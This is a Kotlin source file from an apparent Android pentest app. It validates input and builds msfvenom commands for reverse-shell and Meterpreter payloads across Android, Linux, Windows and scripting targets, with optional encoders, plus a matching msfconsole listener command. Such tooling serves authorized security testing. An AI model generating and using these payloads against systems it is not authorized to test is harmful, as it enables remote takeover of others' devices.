package com.victorious.victordrax.tools.spec

import com.victorious.victordrax.data.Scope

/**
 * Builds msfvenom payload commands and the matching msfconsole exploit/multi/handler command.
 *
 * AUTHORIZED USE ONLY. A payload builder is a standard, legitimate pentest tool: it only *generates*
 * a payload file and *hands it off* to the operator, and spins up a listener for the operator's own
 * authorized test. It deliberately has **no** auto-deploy, spreading, persistence or evasion features —
 * `-e`/`-i` are the stock msfvenom encoder options (bad-character avoidance / compatibility), nothing
 * more. Callers must gate building/launching on an authorized engagement.
 *
 * Pure (no Android deps) so it is unit tested. Values are validated here as defence-in-depth; the
 * launcher still single-quote escapes every argv token exactly once.
 */
object PayloadBuilder {
    private val PAYLOAD = Regex("^[a-z0-9]+(/[a-z0-9_]+)+$")
    private val FILENAME = Regex("^[A-Za-z0-9._-]{1,64}$")
    private val ENCODER = Regex("^[a-z0-9]+(/[a-z0-9_]+)+$")

    /** Curated payload list for the dropdown; a custom value is still accepted if it matches [PAYLOAD]. */
    val PAYLOADS = listOf(
        "android/meterpreter/reverse_tcp",
        "android/meterpreter/reverse_https",
        "android/shell/reverse_tcp",
        "linux/x86/meterpreter/reverse_tcp",
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x64/shell_reverse_tcp",
        "windows/meterpreter/reverse_tcp",
        "windows/x64/meterpreter/reverse_tcp",
        "windows/x64/meterpreter/reverse_https",
        "php/meterpreter/reverse_tcp",
        "python/meterpreter/reverse_tcp",
        "cmd/unix/reverse_bash",
    )

    /** Output formats msfvenom supports that we expose. */
    val FORMATS = listOf(
        "raw", "elf", "exe", "exe-service", "macho", "apk", "dll", "msi",
        "psh", "psh-cmd", "hta-psh", "vbs", "asp", "aspx", "jsp", "war",
        "c", "python", "ruby", "perl", "bash", "powershell", "java",
    )

    /** Optional stock encoders (empty = none). */
    val ENCODERS = listOf("", "x86/shikata_ga_nai", "x64/zutto_dekiru", "cmd/powershell_base64", "x86/call4_dword_xor")

    data class Options(
        val payload: String,
        val lhost: String,
        val lport: String,
        val format: String,
        val encoder: String = "",
        val iterations: String = "",
        val outDir: String = DEFAULT_OUT_DIR,
        val fileName: String = "payload.bin",
    )

    const val DEFAULT_OUT_DIR = "/data/data/com.termux/files/home"

    sealed interface Result {
        data class Ok(val argv: List<String>, val preview: String, val outPath: String) : Result
        data class Err(val message: String) : Result
    }

    /** Reverse payloads need an LHOST; bind payloads do not. */
    fun needsLhost(payload: String): Boolean = !payload.contains("bind")

    private fun validPort(p: String): Boolean = p.toIntOrNull()?.let { it in 1..65535 } == true
    private fun validHost(h: String): Boolean = Scope.isIpv4(h) || Scope.isHostname(h)

    fun buildPayload(o: Options): Result {
        val payload = o.payload.trim()
        if (!PAYLOAD.matches(payload)) return Result.Err("Payload looks invalid (e.g. android/meterpreter/reverse_tcp).")
        if (o.format.trim() !in FORMATS) return Result.Err("Unsupported output format.")
        val lhost = o.lhost.trim()
        if (needsLhost(payload)) {
            if (lhost.isBlank()) return Result.Err("LHOST (your listener address) is required for a reverse payload.")
            if (!validHost(lhost)) return Result.Err("LHOST must be a valid IP or hostname.")
        } else if (lhost.isNotBlank() && !validHost(lhost)) return Result.Err("LHOST must be a valid IP or hostname.")
        if (!validPort(o.lport.trim())) return Result.Err("LPORT must be a port between 1 and 65535.")
        val file = o.fileName.trim()
        if (!FILENAME.matches(file)) return Result.Err("Output filename may use letters, digits, dot, dash, underscore (max 64).")
        if (!com.victorious.victordrax.data.Validation.isSafePath(o.outDir.trim()))
            return Result.Err("Output folder is not a valid absolute path.")
        val encoder = o.encoder.trim()
        if (encoder.isNotEmpty() && !ENCODER.matches(encoder)) return Result.Err("Encoder name looks invalid.")
        val iter = o.iterations.trim()
        if (iter.isNotEmpty()) {
            val n = iter.toIntOrNull() ?: return Result.Err("Iterations must be a whole number.")
            if (n !in 0..50) return Result.Err("Iterations must be between 0 and 50.")
            if (encoder.isEmpty()) return Result.Err("Set an encoder to use iterations.")
        }

        val outPath = o.outDir.trim().trimEnd('/') + "/" + file
        val argv = ArrayList<String>()
        argv += "msfvenom"
        argv += "-p"; argv += payload
        if (lhost.isNotBlank()) argv += "LHOST=$lhost"
        argv += "LPORT=${o.lport.trim()}"
        argv += "-f"; argv += o.format.trim()
        if (encoder.isNotEmpty()) { argv += "-e"; argv += encoder }
        if (iter.isNotEmpty()) { argv += "-i"; argv += iter }
        argv += "-o"; argv += outPath
        return Result.Ok(argv, CommandBuilder.preview(argv), outPath)
    }

    /** exploit/multi/handler matching the payload, as an msfconsole argv. */
    fun buildHandler(o: Options): Result {
        val payload = o.payload.trim()
        if (!PAYLOAD.matches(payload)) return Result.Err("Payload looks invalid.")
        val lhost = o.lhost.trim()
        if (needsLhost(payload)) {
            if (lhost.isBlank()) return Result.Err("LHOST is required to listen for a reverse payload.")
            if (!validHost(lhost)) return Result.Err("LHOST must be a valid IP or hostname.")
        }
        if (!validPort(o.lport.trim())) return Result.Err("LPORT must be a port between 1 and 65535.")
        val lines = ArrayList<String>()
        lines += "use exploit/multi/handler"
        lines += "set PAYLOAD $payload"
        if (lhost.isNotBlank()) lines += "set LHOST $lhost"
        lines += "set LPORT ${o.lport.trim()}"
        lines += "exploit -j"
        val script = lines.joinToString("; ")
        val argv = listOf("msfconsole", "-q", "-x", script)
        return Result.Ok(argv, "msfconsole -q -x \"$script\"", "")
    }
}
